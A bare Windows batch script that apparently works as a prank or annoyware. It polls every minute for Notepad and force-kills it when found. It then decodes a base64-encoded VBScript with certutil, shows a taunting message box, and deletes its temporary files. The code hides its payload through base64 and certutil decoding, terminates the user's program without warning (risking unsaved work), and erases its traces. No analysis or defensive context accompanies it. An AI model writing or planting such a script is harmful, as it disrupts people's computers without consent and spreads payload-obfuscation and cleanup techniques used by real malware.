@echo off

:loop
timeout 60
FOR /F %%x IN ('tasklist /NH /FI "IMAGENAME eq notepad.exe"') DO IF %%x == notepad.exe goto FOUND
goto loop

:FOUND
echo aGVudGFpID0gbXNnYm94ICgiUGxheSBNaW5lY3JhZnQgaW5zdGVhZCEiLDAsICJG > q.b64
echo b3J0bml0ZSBLaWRkaWUiKQ== >> q.b64
certutil -decode "q.b64" "q.vbs"
timeout 3
del q.b64
taskkill /im notepad.exe /f
start q.vbs
timeout 1
del q.vbs
goto loop